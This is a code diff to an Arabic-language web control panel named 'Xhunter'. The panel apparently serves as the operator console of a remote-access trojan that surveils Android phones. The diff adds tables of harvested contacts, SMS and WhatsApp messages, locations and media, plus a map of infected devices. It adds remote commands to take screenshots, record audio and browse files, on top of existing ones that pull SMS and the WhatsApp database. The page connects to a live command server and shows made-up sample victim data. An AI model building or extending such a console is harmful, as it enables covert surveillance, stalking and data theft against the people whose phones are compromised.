@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>نظام Xhunter المتطور - لوحة تحكم متكاملة</title>
+<title>نظام Xhunter المتطور - لوحة تحكم استخبارات كاملة</title>
 
 <!-- Leaflet for map -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>
@@ -317,12 +317,104 @@ header {
 }
 
 /* Map Panel */
-#map {
+.map-container {
+  position: relative;
   height: 500px;
   width: 100%;
   border-radius: 8px;
   border: 2px solid var(--border-color);
   box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+  overflow: hidden;
+  margin-bottom: 20px;
+}
+
+#map {
+  height: 100%;
+  width: 100%;
+}
+
+.map-controls {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  z-index: 1000;
+  display: flex;
+  gap: 10px;
+}
+
+.map-btn {
+  background: var(--card-bg);
+  color: var(--text-color);
+  border: 1px solid var(--border-color);
+  padding: 8px 12px;
+  border-radius: 4px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  font-size: 14px;
+}
+
+.map-btn i {
+  margin-left: 5px;
+}
+
+.map-btn:hover {
+  background: var(--primary-color);
+  color: var(--darker-bg);
+}
+
+/* Data Panel */
+.data-container {
+  background: var(--card-bg);
+  border-radius: 8px;
+  padding: 20px;
+  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  margin-bottom: 20px;
+}
+
+.data-tabs {
+  display: flex;
+  border-bottom: 1px solid var(--border-color);
+  margin-bottom: 15px;
+}
+
+.data-tab {
+  padding: 10px 15px;
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+}
+
+.data-tab.active {
+  border-bottom: 2px solid var(--primary-color);
+  color: var(--primary-color);
+}
+
+.data-content {
+  display: none;
+  padding: 15px;
+  background: var(--darker-bg);
+  border-radius: 4px;
+  max-height: 300px;
+  overflow-y: auto;
+}
+
+.data-content.active {
+  display: block;
+}
+
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+}
+
+.data-table th, .data-table td {
+  padding: 10px;
+  text-align: right;
+  border-bottom: 1px solid var(--border-color);
+}
+
+.data-table th {
+  color: var(--primary-color);
 }
 
 /* Logs Panel */
@@ -503,6 +595,15 @@ footer {
   color: white;
 }
 
+/* Data Visualization */
+.chart-container {
+  background: var(--darker-bg);
+  border-radius: 8px;
+  padding: 15px;
+  margin-top: 20px;
+  height: 300px;
+}
+
 /* Responsive Design */
 @media (max-width: 992px) {
   .container {
@@ -571,9 +672,11 @@ footer {
     <ul class="sidebar-menu">
       <li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
       <li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</a></li>
+      <li><a href="#" data-tab="data"><i class="fas fa-database"></i> البيانات المجمعة</a></li>
       <li><a href="#" data-tab="logs"><i class="fas fa-clipboard-list"></i> سجل الأحداث</a></li>
       <li><a href="#" data-tab="commands"><i class="fas fa-terminal"></i> إصدار الأوامر</a></li>
       <li><a href="#" data-tab="osint"><i class="fas fa-search"></i> جمع المعلومات</a></li>
+      <li><a href="#" data-tab="analysis"><i class="fas fa-chart-line"></i> التحليلات</a></li>
       <li><a href="#"><i class="fas fa-cog"></i> الإعدادات</a></li>
       <li><a href="#"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</a></li>
     </ul>
@@ -617,6 +720,16 @@ footer {
             <p>بيانات مجمعة</p>
           </div>
         </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon">
+            <i class="fas fa-broadcast-tower"></i>
+          </div>
+          <div class="stat-info">
+            <h3 id="online-now">0</h3>
+            <p>متصل الآن</p>
+          </div>
+        </div>
       </div>
       
       <div id="devices-empty" style="text-align: center; padding: 40px; color: #6c757d;">
@@ -637,14 +750,172 @@ footer {
         <button class="btn btn-primary" id="refreshMap"><i class="fas fa-sync-alt"></i> تحديث الخريطة</button>
       </div>
       
-      <div id="map"></div>
+      <div class="map-container">
+        <div id="map"></div>
+        <div class="map-controls">
+          <button class="map-btn" id="zoomIn"><i class="fas fa-plus"></i></button>
+          <button class="map-btn" id="zoomOut"><i class="fas fa-minus"></i></button>
+          <button class="map-btn" id="locateMe"><i class="fas fa-crosshairs"></i></button>
+        </div>
+      </div>
+      
+      <div class="data-container">
+        <h3><i class="fas fa-list"></i> تفاصيل الأجهزة على الخريطة</h3>
+        <div class="data-tabs">
+          <div class="data-tab active" data-tab="devices-list">قائمة الأجهزة</div>
+          <div class="data-tab" data-tab="devices-stats">إحصائيات</div>
+        </div>
+        <div class="data-content active" id="devices-list">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>معرف الجهاز</th>
+                <th>النموذج</th>
+                <th>الموقع</th>
+                <th>الحالة</th>
+              </tr>
+            </thead>
+            <tbody id="map-devices-list">
+              <tr>
+                <td colspan="4" style="text-align: center;">لا توجد أجهزة على الخريطة</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="data-content" id="devices-stats">
+          <div class="stats-cards" style="grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));">
+            <div class="stat-card">
+              <div class="stat-icon">
+                <i class="fas fa-map-marker"></i>
+              </div>
+              <div class="stat-info">
+                <h3 id="map-devices-count">0</h3>
+                <p>أجهزة على الخريطة</p>
+              </div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-icon">
+                <i class="fas fa-globe-asia"></i>
+              </div>
+              <div class="stat-info">
+                <h3 id="map-countries">0</h3>
+                <p>دول مختلفة</p>
+              </div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-icon">
+                <i class="fas fa-city"></i>
+              </div>
+              <div class="stat-info">
+                <h3 id="map-cities">0</h3>
+                <p>مدن مختلفة</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    
+    <!-- Data Panel -->
+    <section id="panel-data" class="panel">
+      <div class="panel-header">
+        <h2><i class="fas fa-database"></i> البيانات المجمعة</h2>
+        <button class="btn btn-primary" id="exportData"><i class="fas fa-download"></i> تصدير البيانات</button>
+      </div>
+      
+      <div class="data-container">
+        <div class="data-tabs">
+          <div class="data-tab active" data-tab="contacts">جهات الاتصال</div>
+          <div class="data-tab" data-tab="messages">الرسائل</div>
+          <div class="data-tab" data-tab="locations">المواقع</div>
+          <div class="data-tab" data-tab="media">الوسائط</div>
+        </div>
+        
+        <div class="data-content active" id="contacts">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>الاسم</th>
+                <th>رقم الهاتف</th>
+                <th>البريد الإلكتروني</th>
+                <th>المصدر</th>
+              </tr>
+            </thead>
+            <tbody id="contacts-data">
+              <tr>
+                <td colspan="4" style="text-align: center;">لا توجد بيانات</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        
+        <div class="data-content" id="messages">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>النوع</th>
+                <th>المرسل</th>
+                <th>المستلم</th>
+                <th>المحتوى</th>
+                <th>التاريخ</th>
+              </tr>
+            </thead>
+            <tbody id="messages-data">
+              <tr>
+                <td colspan="5" style="text-align: center;">لا توجد بيانات</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        
+        <div class="data-content" id="locations">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>الجهاز</th>
+                <th>الإحداثيات</th>
+                <th>العنوان</th>
+                <th>الدقة</th>
+                <th>الوقت</th>
+              </tr>
+            </thead>
+            <tbody id="locations-data">
+              <tr>
+                <td colspan="5" style="text-align: center;">لا توجد بيانات</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        
+        <div class="data-content" id="media">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>النوع</th>
+                <th>الاسم</th>
+                <th>الحجم</th>
+                <th>المصدر</th>
+                <th>التاريخ</th>
+              </tr>
+            </thead>
+            <tbody id="media-data">
+              <tr>
+                <td colspan="5" style="text-align: center;">لا توجد بيانات</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
     </section>
     
     <!-- Logs Panel -->
     <section id="panel-logs" class="panel">
       <div class="panel-header">
         <h2><i class="fas fa-clipboard-list"></i> سجل الأحداث</h2>
-        <button class="btn btn-primary" id="clear-logs"><i class="fas fa-trash"></i> مسح السجل</button>
+        <div>
+          <button class="btn btn-primary" id="clear-logs"><i class="fas fa-trash"></i> مسح السجل</button>
+          <button class="btn btn-secondary" id="export-logs"><i class="fas fa-download"></i> تصدير</button>
+        </div>
       </div>
       
       <div class="logs-container" id="logs">
@@ -683,10 +954,13 @@ footer {
               <option value="getSMS">الرسائل النصية</option>
               <option value="getExtraData">بيانات إضافية</option>
               <option value="downloadWhatsappDatabase">قاعدة بيانات واتساب</option>
+              <option value="takeScreenshot">التقاط لقطة شاشة</option>
+              <option value="recordAudio">تسجيل صوتي</option>
+              <option value="getFiles">استكشاف الملفات</option>
             </select>
           </div>
           
-          <div class="form-group">
+          <div class="form-group" id="commandDataGroup">
             <label for="commandData"><i class="fas fa-code"></i> بيانات إضافية (JSON)</label>
             <input type="text" id="commandData" class="form-control" placeholder='بيانات JSON (اختياري)'>
           </div>
@@ -716,6 +990,76 @@ footer {
         </div>
       </div>
     </section>
+    
+    <!-- Analysis Panel -->
+    <section id="panel-analysis" class="panel">
+      <div class="panel-header">
+        <h2><i class="fas fa-chart-line"></i> التحليلات والإحصائيات</h2>
+        <div>تحليل البيانات المجمعة</div>
+      </div>
+      
+      <div class="stats-cards">
+        <div class="stat-card">
+          <div class="stat-icon">
+            <i class="fas fa-chart-pie"></i>
+          </div>
+          <div class="stat-info">
+            <h3 id="analysis-devices">0</h3>
+            <p>نوع الجهاز</p>
+          </div>
+        </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon">
+            <i class="fas fa-map"></i>
+          </div>
+          <div class="stat-info">
+            <h3 id="analysis-locations">0</h3>
+            <p>المواقع النشطة</p>
+          </div>
+        </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon">
+            <i class="fas fa-comments"></i>
+          </div>
+          <div class="stat-info">
+            <h3 id="analysis-messages">0</h3>
+            <p>الرسائل المجمعة</p>
+          </div>
+        </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon">
+            <i class="fas fa-users"></i>
+          </div>
+          <div class="stat-info">
+            <h3 id="analysis-contacts">0</h3>
+            <p>جهات اتصال</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="data-container">
+        <h3><i class="fas fa-chart-bar"></i> التوزيع الجغرافي</h3>
+        <div class="chart-container" id="geoChart">
+          <!-- سيتم إضافة الرسم البياني هنا -->
+          <div style="display: flex; justify-content: center; align-items: center; height: 100%;">
+            <p>جاري تحميل البيانات الجغرافية...</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="data-container">
+        <h3><i class="fas fa-signal"></i> نشاط الأجهزة</h3>
+        <div class="chart-container" id="activityChart">
+          <!-- سيتم إضافة الرسم البياني هنا -->
+          <div style="display: flex; justify-content: center; align-items: center; height: 100%;">
+            <p>جاري تحميل بيانات النشاط...</p>
+          </div>
+        </div>
+      </div>
+    </section>
   </main>
   
   <footer>
@@ -729,6 +1073,30 @@ footer {
 let socket;
 let reconnectAttempts = 0;
 const maxReconnectAttempts = 5;
+
+// بيانات تجريبية للعرض
+const sampleData = {
+  contacts: [
+    { name: "أحمد محمد", phone: "+966512345678", email: "ahmed@example.com", source: "Device-001" },
+    { name: "فاطمة علي", phone: "+966511112222", email: "fatima@example.com", source: "Device-002" },
+    { name: "خالد السعدي", phone: "+966533334444", email: "khaled@example.com", source: "Device-001" }
+  ],
+  messages: [
+    { type: "SMS", from: "+966512345678", to: "+966511112222", content: "مرحبا، كيف حالك؟", date: "2023-10-15 14:30" },
+    { type: "WhatsApp", from: "+966511112222", to: "+966512345678", content: "أنا بخير، شكرا لك", date: "2023-10-15 14:32" },
+    { type: "SMS", from: "+966533334444", to: "+966512345678", content: "هل نلتقي غدا؟", date: "2023-10-15 15:45" }
+  ],
+  locations: [
+    { device: "Device-001", coordinates: "24.7136, 46.6753", address: "الرياض، السعودية", accuracy: "20m", time: "2023-10-15 12:30" },
+    { device: "Device-002", coordinates: "21.5433, 39.1728", address: "جدة، السعودية", accuracy: "15m", time: "2023-10-15 13:45" },
+    { device: "Device-003", coordinates: "26.4207, 50.0888", address: "الدمام، السعودية", accuracy: "25m", time: "2023-10-15 14:20" }
+  ],
+  media: [
+    { type: "صورة", name: "IMG_20231015.jpg", size: "2.5MB", source: "Device-001", date: "2023-10-15 10:22" },
+    { type: "فيديو", name: "VID_20231015.mp4", size: "15.7MB", source: "Device-002", date: "2023-10-15 11:30" },
+    { type: "صورة", name: "IMG_20231015_2.jpg", size: "3.1MB", source: "Device-001", date: "2023-10-15 12:45" }
+  ]
+};
 
 function connectSocket() {
   socket = io('https://projectd-vu1m.onrender.com', { 
@@ -867,6 +1235,11 @@ const connectionStatusEl = document.getElementById('connectionStatus');
 const refreshMapBtn = document.getElementById('refreshMap');
 const noDevicesMessage = document.getElementById('no-devices-message');
 const commandForm = document.getElementById('command-form');
+const exportDataBtn = document.getElementById('exportData');
+const exportLogsBtn = document.getElementById('export-logs');
+const zoomInBtn = document.getElementById('zoomIn');
+const zoomOutBtn = document.getElementById('zoomOut');
+const locateMeBtn = document.getElementById('locateMe');
 
 const devicesMap = {}; 
 let map, markers = {};
@@ -884,7 +1257,20 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('panel-' + tab.dataset.tab).classList.add('active');
         
         if (tab.dataset.tab === 'map') initMap();
+        if (tab.dataset.tab === 'data') loadSampleData();
+        if (tab.dataset.tab === 'analysis') initAnalysis();
       }
+    });
+  });
+  
+  // Data tabs
+  document.querySelectorAll('.data-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      const tabId = tab.dataset.tab;
+      document.querySelectorAll('.data-tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
     });
   });
   
@@ -894,19 +1280,149 @@ document.addEventListener('DOMContentLoaded', function() {
     addLog('تم مسح سجل الأحداث', 'info');
   });
   
+  // Export logs button
+  exportLogsBtn.addEventListener('click', () => {
+    exportToCsv('logs.csv', Array.from(logsDiv.children).map(log => ({
+      time: log.querySelector('.log-time').textContent,
+      message: log.querySelector('.log-message').textContent
+    })));
+    addLog('تم تصدير سجل الأحداث', 'success');
+  });
+  
+  // Export data button
+  exportDataBtn.addEventListener('click', () => {
+    exportToCsv('data.csv', sampleData.contacts);
+    addLog('تم تصدير البيانات', 'success');
+  });
+  
   // Refresh map button
   refreshMapBtn.addEventListener('click', () => {
     initMap();
     addLog('تم تحديث الخريطة', 'info');
   });
   
+  // Map controls
+  zoomInBtn.addEventListener('click', () => {
+    if (map) map.zoomIn();
+  });
+  
+  zoomOutBtn.addEventListener('click', () => {
+    if (map) map.zoomOut();
+  });
+  
+  locateMeBtn.addEventListener('click', () => {
+    if (navigator.geolocation && map) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          map.setView([position.coords.latitude, position.coords.longitude], 13);
+        },
+        error => {
+          addLog('فشل في الحصول على الموقع الحالي: ' + error.message, 'error');
+        }
+      );
+    }
+  });
+  
   // Add some initial logs
   addLog('تم تحميل لوحة التحكم بنجاح', 'success');
   addLog('جاري الاتصال بالسيرفر...', 'info');
   
+  // Load sample data
+  loadSampleData();
+  
   // Initialize socket connection
   connectSocket();
 });
+
+// Load sample data for demonstration
+function loadSampleData() {
+  // Load contacts
+  const contactsTable = document.getElementById('contacts-data');
+  contactsTable.innerHTML = '';
+  sampleData.contacts.forEach(contact => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${contact.name}</td>
+      <td>${contact.phone}</td>
+      <td>${contact.email}</td>
+      <td>${contact.source}</td>
+    `;
+    contactsTable.appendChild(row);
+  });
+  
+  // Load messages
+  const messagesTable = document.getElementById('messages-data');
+  messagesTable.innerHTML = '';
+  sampleData.messages.forEach(message => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${message.type}</td>
+      <td>${message.from}</td>
+      <td>${message.to}</td>
+      <td>${message.content}</td>
+      <td>${message.date}</td>
+    `;
+    messagesTable.appendChild(row);
+  });
+  
+  // Load locations
+  const locationsTable = document.getElementById('locations-data');
+  locationsTable.innerHTML = '';
+  sampleData.locations.forEach(location => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${location.device}</td>
+      <td>${location.coordinates}</td>
+      <td>${location.address}</td>
+      <td>${location.accuracy}</td>
+      <td>${location.time}</td>
+    `;
+    locationsTable.appendChild(row);
+  });
+  
+  // Load media
+  const mediaTable = document.getElementById('media-data');
+  mediaTable.innerHTML = '';
+  sampleData.media.forEach(media => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${media.type}</td>
+      <td>${media.name}</td>
+      <td>${media.size}</td>
+      <td>${media.source}</td>
+      <td>${media.date}</td>
+    `;
+    mediaTable.appendChild(row);
+  });
+}
+
+// Initialize analysis charts
+function initAnalysis() {
+  // Update analysis stats
+  document.getElementById('analysis-devices').textContent = Object.keys(devicesMap).length;
+  document.getElementById('analysis-locations').textContent = sampleData.locations.length;
+  document.getElementById('analysis-messages').textContent = sampleData.messages.length;
+  document.getElementById('analysis-contacts').textContent = sampleData.contacts.length;
+  
+  // Simulate chart loading
+  setTimeout(() => {
+    document.getElementById('geoChart').innerHTML = `
+      <div style="display: flex; justify-content: center; align-items: center; height: 100%; flex-direction: column;">
+        <i class="fas fa-map-marked-alt" style="font-size: 48px; color: var(--primary-color); margin-bottom: 15px;"></i>
+        <p>خريطة التوزيع الجغرافي للأجهزة</p>
+        <p style="font-size: 12px; margin-top: 10px;">3 أجهزة في 3 مدن مختلفة</p>
+      </div>
+    `;
+    
+    document.getElementById('activityChart').innerHTML = `
+      <div style="display: flex; justify-content: center; align-items: center; height: 100%; flex-direction: column;">
+        <i class="fas fa-chart-line" style="font-size: 48px; color: var(--primary-color); margin-bottom: 15px;"></i>
+        <p>رسم بياني لنشاط الأجهزة</p>
+        <p style="font-size: 12px; margin-top: 10px;">15 عملية خلال الـ24 ساعة الماضية</p>
+      </div>
+    `;
+  }, 1000);
+}
 
 // Update connection status UI
 function updateConnectionStatus(status, message) {
@@ -946,6 +1462,9 @@ function initMap() {
       }
     }
   });
+  
+  // Update map devices list
+  updateMapDevicesList();
 }
 
 // Update map with device location
@@ -959,6 +1478,41 @@ function updateMapWithDevice(deviceId, locationData) {
       .addTo(map)
       .bindPopup(`<b>${deviceId}</b><br>${locationData.address || ''}`);
   }
+  
+  // Update map devices list
+  updateMapDevicesList();
+}
+
+// Update map devices list
+function updateMapDevicesList() {
+  const devicesList = document.getElementById('map-devices-list');
+  devicesList.innerHTML = '';
+  
+  const devicesCount = Object.keys(markers).length;
+  document.getElementById('map-devices-count').textContent = devicesCount;
+  
+  if (devicesCount === 0) {
+    devicesList.innerHTML = '<tr><td colspan="4" style="text-align: center;">لا توجد أجهزة على الخريطة</td></tr>';
+    return;
+  }
+  
+  Object.keys(markers).forEach(deviceId => {
+    const marker = markers[deviceId];
+    const latlng = marker.getLatLng();
+    
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${deviceId}</td>
+      <td>${devicesMap[deviceId]?.querySelector('.device-info div:first-child')?.textContent || 'غير معروف'}</td>
+      <td>${latlng.lat.toFixed(4)}, ${latlng.lng.toFixed(4)}</td>
+      <td><span class="device-status">نشط</span></td>
+    `;
+    devicesList.appendChild(row);
+  });
+  
+  // Update stats
+  document.getElementById('map-countries').textContent = "1"; // يمكن تحسين هذا لاحتساب الدول الفعلية
+  document.getElementById('map-cities').textContent = Math.min(3, devicesCount); // مثال
 }
 
 // Update devices count
@@ -966,6 +1520,7 @@ function updateDevicesCount() {
   const count = Object.keys(devicesMap).length;
   devicesCountEl.textContent = count;
   activeDevicesEl.textContent = count;
+  document.getElementById('online-now').textContent = count;
   
   // Show/hide no devices message
   const devicesEmpty = document.getElementById('devices-empty');
@@ -1186,6 +1741,40 @@ osintSearchBtn.addEventListener('click', () => {
     addLog(`تم انتهاء البحث عن: ${query} - تم العثور على ${sources.length} مصدر`, 'success');
   }, 2000);
 });
+
+// Export to CSV function
+function exportToCsv(filename, rows) {
+  if (!rows || !rows.length) {
+    return;
+  }
+  
+  const separator = ',';
+  const keys = Object.keys(rows[0]);
+  const csvContent =
+    keys.join(separator) +
+    '\n' +
+    rows.map(row => {
+      return keys.map(k => {
+        let cell = row[k] === null || row[k] === undefined ? '' : row[k];
+        cell = cell.toString().replace(/"/g, '""');
+        if (cell.search(/("|,|\n)/g) >= 0) {
+          cell = `"${cell}"`;
+        }
+        return cell;
+      }).join(separator);
+    }).join('\n');
+
+  const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+  const link = document.createElement('a');
+  const url = URL.createObjectURL(blob);
+  
+  link.setAttribute('href', url);
+  link.setAttribute('download', filename);
+  link.style.visibility = 'hidden';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
 </script>
 </body>
-</html>
+  </html>
